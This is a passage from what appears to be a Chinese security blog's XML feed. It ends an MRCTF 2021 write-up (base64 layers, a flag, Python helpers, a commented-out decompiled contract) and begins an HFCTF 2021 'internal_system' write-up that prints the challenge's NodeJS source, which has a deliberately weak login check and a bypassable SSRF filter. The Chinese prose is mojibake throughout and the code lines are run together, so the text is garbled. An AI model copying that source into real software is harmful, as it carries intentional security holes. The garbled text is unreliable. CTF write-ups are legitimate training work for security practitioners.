aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre><p>æŠŠæœ€åçš„ <code>a</code> ç»™å»æ‰ï¼Œç„¶åä¸åœè§£ base64ã€‚</p><p>è²Œä¼¼å¥—äº†22å±‚ base64ï¼Œå°±ç¦»è°±ã€‚</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210418000625265.png"></p><p><code>MRCTF{bUt_Y0u_c@n_f1yyyyyyyy~}</code></p><blockquote><p>BTW, å®˜æ–¹ WP è¿™ä¸ªç§»ä½åŠ ç½®ä½çš„æ–¹å¼å†™èµ·æ¥æŒºæ–¹ä¾¿çš„ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ch <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> judge<span class="token punctuation">(</span>pim<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                ch <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span></code></pre><p>å¦å¤–æ¥æŠ„ä¸€ä¸‹ <a href="http://snowywar.top/wordpress/index.php/2021/04/11/mrctf2021-plane-wp/">snowywar å¸ˆå‚…æ±‚ç©ºé—´å¹³é¢æ–¹ç¨‹çš„è§£æ³•</a>ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npmark <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">define_area</span><span class="token punctuation">(</span>point1<span class="token punctuation">,</span> point2<span class="token punctuation">,</span> point3<span class="token punctuation">)</span><span class="token punctuation">:</span>    point1 <span class="token operator">=</span> np<span class="token punctuation">.</span>asarray<span class="token punctuation">(</span>point1<span class="token punctuation">)</span>    point2 <span class="token operator">=</span> np<span class="token punctuation">.</span>asarray<span class="token punctuation">(</span>point2<span class="token punctuation">)</span>    point3 <span class="token operator">=</span> np<span class="token punctuation">.</span>asarray<span class="token punctuation">(</span>point3<span class="token punctuation">)</span>    AB <span class="token operator">=</span> np<span class="token punctuation">.</span>asmatrix<span class="token punctuation">(</span>point2 <span class="token operator">-</span> point1<span class="token punctuation">)</span>    AC <span class="token operator">=</span> np<span class="token punctuation">.</span>asmatrix<span class="token punctuation">(</span>point3 <span class="token operator">-</span> point1<span class="token punctuation">)</span>    N <span class="token operator">=</span> np<span class="token punctuation">.</span>cross<span class="token punctuation">(</span>AB<span class="token punctuation">,</span> AC<span class="token punctuation">)</span>  <span class="token comment"># å‘é‡å‰ä¹˜ï¼Œæ±‚æ³•å‘é‡</span>    <span class="token comment"># Ax+By+Cz</span>    Ax <span class="token operator">=</span> N<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>    By <span class="token operator">=</span> N<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>    Cz <span class="token operator">=</span> N<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>    D <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span>Ax <span class="token operator">*</span> point1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> By <span class="token operator">*</span> point1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> Cz <span class="token operator">*</span> point1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>Ax<span class="token punctuation">,</span> <span class="token operator">-</span>By<span class="token punctuation">,</span> <span class="token operator">-</span>Cz<span class="token punctuation">,</span> <span class="token operator">-</span>Dres <span class="token operator">=</span> <span class="token string">""</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d <span class="token operator">=</span> define_area<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">)</span></code></pre><p>äºæ˜¯å¯ä»¥å¾—åˆ°ç©ºé—´å¹³é¢æ–¹ç¨‹ <code>Ax+By+Cz+D=0</code> çš„ç³»æ•°ã€‚</p></blockquote><br><hr><br><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å¤ªé¡¶äº†å¤ªé¡¶äº†ï¼</p><p>åŒ—é‚®çš„å¸ˆå‚…ä»¬å¤ªå¼ºäº† Orzã€‚</p><p>BTWï¼Œå¸ˆå‚…ä»¬è‡ªå·±å¼€å‘çš„è¿™ä¸ª CTFm å¹³å°è¿˜ä¸é”™ï¼Œåªæ˜¯å¯èƒ½è¿˜æ¯”è¾ƒæ–°çš„åŸå› è¿˜æœ‰ç‚¹å° bugï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œæ…¢æ…¢æ¥å˜›ã€‚</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230721513.png"></p><p><del>æ¯”å¦‚ profile é¡µé¢è¿™é‡Œçš„åå­—è²Œä¼¼åªæ˜¯å‰ç«¯åšäº†é™åˆ¶ï¼Œåç«¯å¹¶æ²¡æœ‰é™åˆ¶æ¥ç€ï¼ˆè™½ç„¶å›¾ç‰‡ä¸Šæ²¡æœ‰ä½“ç°</del></p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230826508.png"></p><p><em>ï¼ˆæ¯”èµ›çš„æ—¶å€™å°±åšäº†ä¸¤é¢˜ + é—®å· check outï¼Œç„¶å rk45ï¼Œå°±ç¦»è°±</em></p><blockquote><p>å™¢ï¼Œ<strong>å®˜æ–¹ WriteUp</strong> ä¹Ÿå‡ºæ¥äº†ï¼ˆ</p><p><a href="https://www.anquanke.com/post/id/237901">MRCTF Misc å®˜æ–¹WriteUp</a></p><p><a href="https://www.anquanke.com/post/id/237793">MRCTF2021 Reverseå®˜æ–¹wp</a></p><p><a href="https://www.anquanke.com/post/id/237898">MRCTF2021 CRYPTOå®˜æ–¹wp</a></p><p><a href="https://www.anquanke.com/post/id/237797">MRCTF2021 å®˜æ–¹ETH&amp;IOTæ–¹å‘Wp</a></p><p><a href="https://www.anquanke.com/post/id/237897">MRCTF2021 å®˜æ–¹PWNæ–¹å‘Wp</a></p><p><del>ï¼ˆæ€ä¹ˆ web è¿˜æ²¡æœ‰å‘¢</del> ç»ˆäºæœ‰äº†</p><p><a href="https://www.anquanke.com/post/id/237917">MRCTF2021 Webæ–¹å‘Wp</a></p></blockquote><p>å°±è¿™æ ·å§ã€‚ç´¯æ­»äº†ã€‚</p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p><!--## ETH### Check_IN> - 0xE27eAb49f660451df7157cA812fcF1c719Cf504e@Ropsten> - Web address: node.mrctf.fun:10001> - A really ez game that everyone can solve it.,https://ropsten.etherscan.io/bytecode-decompiler?a=0xe27eab49f660451df7157ca812fcf1c719cf504e<pre class="language-none"><code class="language-none">##  Panoramix v4 Oct 2019 #  Decompiled source of ropsten:0xE27eAb49f660451df7157cA812fcF1c719Cf504e# #  Let&#39;s make the world open source # def storage:  stor1 is mapping of uint8 at storage 1  stor2 is mapping of uint8 at storage 2  unknownd1f6722e is mapping of uint256 at storage 3  unknownba9ed984Address is addr at storage 4def unknown5422224e(addr _param1): # not payable  return bool(stor2[_param1])def unknown74772eb3(uint256 _param1): # not payable  return bool(stor1[_param1])def unknownba9ed984(): # not payable  return unknownba9ed984Addressdef unknownd1f6722e(addr _param1): # not payable  return unknownd1f6722e[_param1]##  Regular functions#def _fallback() payable: # default function  revertdef unknown803255cf(addr _param1): # not payable  if not stor2[caller]:      require ext_code.size(unknownba9ed984Address)      call unknownba9ed984Address.model(address param1) with:           gas gas_remaining wei          args caller      if not ext_call.success:          revert with ext_call.return_data[0 len return_data.size]      require return_data.size &gt;&#x3D; 32      if not ext_call.return_data[0]:          revert with 0, &#39;You are not allowed to use this&#39;  stor2[addr(_param1)] &#x3D; 1def unknown4804a623(): # not payable  if not stor2[caller]:      require ext_code.size(unknownba9ed984Address)      call unknownba9ed984Address.model(address param1) with:           gas gas_remaining wei          args caller      if not ext_call.success:          revert with ext_call.return_data[0 len return_data.size]      require return_data.size &gt;&#x3D; 32      if not ext_call.return_data[0]:          revert with 0, &#39;You are not allowed to use this&#39;  require unknownd1f6722e[caller] &gt; 10^18  stor1[caller] &#x3D; 1def unknown39b4b0d6() payable:   if not stor2[caller]:      require ext_code.size(unknownba9ed984Address)      call unknownba9ed984Address.model(address param1) with:           gas gas_remaining wei          args caller      if not ext_call.success:          revert with ext_call.return_data[0 len return_data.size]      require return_data.size &gt;&#x3D; 32      if not ext_call.return_data[0]:          revert with 0, &#39;You are not allowed to use this&#39;  if 10^10 * block.timestamp % 100 * 10^6 &#x3D;&#x3D; call.value:      unknownd1f6722e[caller] +&#x3D; call.value      call caller with:         value call.value wei           gas 2300 * is_zero(value) wei      if not ext_call.success:          revert with ext_call.return_data[0 len return_data.size]def unknownf2889ac4(addr _param1) payable:   create contract with 0 wei                  code: 0x6080604052604051602080610199833981018060405281019080805190602001909291905050506720607b23a4fc80003073ffffffffffffffffffffffffffffffffffffffff163114156100a55760016000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055505b5060e5806100b46000396000f300608060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633df18d2a146041575b005b348015604c57600080fd5b50607f600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506099565b604051808215151515815260200191505060405180910390f35b60006020528060005260406000206000915054906101000a900460ff16815600a165627a7a72305820745e57a4423074f83d04e2448b3847ef1a25af605e309ab7927f9168d14708c200, addr(_param1)  if not create.new_address:      revert with ext_call.return_data[0 len return_data.size]  unknownba9ed984Address &#x3D; addr(create.new_address)</code></pre><p>â€“&gt;</p>-->]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 è™ç¬¦CTF Web internal_system å¤ç°</title>
      <link href="2021/04/05/CTF_2021HFCTF_internal_system/"/>
      <url>2021/04/05/CTF_2021HFCTF_internal_system/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>å‰å‡ å¤©æ‰“äº†ä¸ª 2021 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“ï¼Œæˆ–è€…è¯´æ˜¯ è™ç¬¦ CTFã€‚</p><p>å†™äº†å‡ é“ Web çš„ Writeup ä¸¢åœ¨ä¸‹é¢è¿™é‡Œäº†ã€‚</p><blockquote><p><a href="https://miaotony.xyz/2021/04/04/CTF_2021HFCTF/">CTF | 2021 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“ WriteUp</a></p></blockquote><p>Web ä¸­è¿˜æœ‰ä¸€é“é›¶è§£çš„é¢˜ç›®ï¼Œå³ internal_systemã€‚</p><p>æ­£å¥½çœ‹åˆ°èµµæ€»çš„ buuoj å¼€äº†ç¯å¢ƒï¼Œè¶ç€è¿˜æœ‰å…´è¶£ï¼Œå°±æ¥å¤ç°ä¸€ä¸‹å§ã€‚</p><blockquote><p><strong>ç¯å¢ƒï¼š</strong> <a href="https://buuoj.cn/challenges#%5B%E8%99%8E%E7%AC%A6CTF%202021%5DInternal%20System">[è™ç¬¦CTF 2021] Internal System</a></p><p>å¤ç°è¿‡ç¨‹ä¸»è¦å‚è€ƒäº† glzjin å¸ˆå‚…çš„ <a href="https://www.zhaoj.in/read-6905.html">è™ç¬¦ CTF2021 Web é›¶è§£é¢˜ Internal System WriteUp</a></p></blockquote><h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><blockquote><p>å¼€å‘äº†ä¸€ä¸ªå…¬å¸å†…éƒ¨çš„è¯·æ±‚ä»£ç†ç½‘ç«™ï¼Œå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œä½†æ¥ä¸åŠäº†è¿˜æ˜¯å…ˆä¸Šçº¿å§ï¼ˆâ”€.â”€||ï¼‰</p><p><a href="http://8.140.152.226:47921/">http://8.140.152.226:47921/</a></p><p><strong>hint:</strong> /sourceå­˜åœ¨æºç æ³„éœ²ï¼›/proxyå­˜åœ¨ssrf</p></blockquote><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><h3 id="Step-01-ç™»å½•-JS-å¼±ç±»å‹ç»•è¿‡"><a href="#Step-01-ç™»å½•-JS-å¼±ç±»å‹ç»•è¿‡" class="headerlink" title="Step 01 ç™»å½• JS å¼±ç±»å‹ç»•è¿‡"></a>Step 01 ç™»å½• JS å¼±ç±»å‹ç»•è¿‡</h3><p>è®¿é—® <code>/source</code> å¾—åˆ°æºç ï¼Œå•Šæ˜¯ NodeJSã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> axios <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'axios'</span><span class="token punctuation">)</span><span class="token keyword">const</span> isIp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'is-ip'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token constant">IP</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">)</span><span class="token keyword">const</span> UrlParse <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'url-parse'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">{</span>sha256<span class="token punctuation">,</span> hint<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./utils'</span><span class="token punctuation">)</span><span class="token keyword">const</span> salt <span class="token operator">=</span> <span class="token string">'nooooooooodejssssssssss8_issssss_beeeeest'</span><span class="token keyword">const</span> adminHash <span class="token operator">=</span> <span class="token function">sha256</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>salt <span class="token operator">+</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">sha256</span><span class="token punctuation">(</span>salt <span class="token operator">+</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token keyword">function</span> <span class="token function">formatResopnse</span><span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> response    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">SSRF_WAF</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> host <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UrlParse</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\[|\]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">isIp</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">IP</span><span class="token punctuation">.</span><span class="token function">isPublic</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">FLAG_WAF</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> pathname <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UrlParse</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>pathname    <span class="token keyword">return</span> <span class="token operator">!</span>pathname<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">OTHER_WAF</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">const</span> <span class="token constant">WAF_LISTS</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token constant">OTHER_WAF</span><span class="token punctuation">,</span> <span class="token constant">SSRF_WAF</span><span class="token punctuation">,</span> <span class="token constant">FLAG_WAF</span><span class="token punctuation">]</span> router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> password<span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password <span class="token operator">||</span> username <span class="token operator">===</span> password <span class="token operator">||</span> username<span class="token punctuation">.</span>length <span class="token operator">===</span> password<span class="token punctuation">.</span>length <span class="token operator">||</span> username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token function">sha256</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>salt <span class="token operator">+</span> username<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">sha256</span><span class="token punctuation">(</span>salt <span class="token operator">+</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span>        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">=</span> hash <span class="token operator">===</span> adminHash        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>admin<span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/proxy'</span><span class="token punctuation">,</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">const</span> status <span class="token operator">=</span> <span class="token constant">WAF_LISTS</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">waf</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token function">waf</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>a<span class="token operator">&amp;&amp;</span>b<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'WAF'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">"Here is the waf..."</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://127.0.0.1:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/search?url=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token 